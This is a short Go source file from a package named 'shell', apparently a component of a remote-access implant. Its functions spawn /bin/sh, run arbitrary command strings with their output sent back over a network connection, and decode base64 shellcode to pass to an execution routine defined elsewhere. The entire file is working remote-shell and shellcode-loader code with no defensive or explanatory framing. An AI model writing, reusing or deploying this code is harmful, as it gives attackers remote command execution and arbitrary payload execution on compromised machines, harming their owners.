package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			ExecShellcode(shellcode)
		}
	}
	return
}
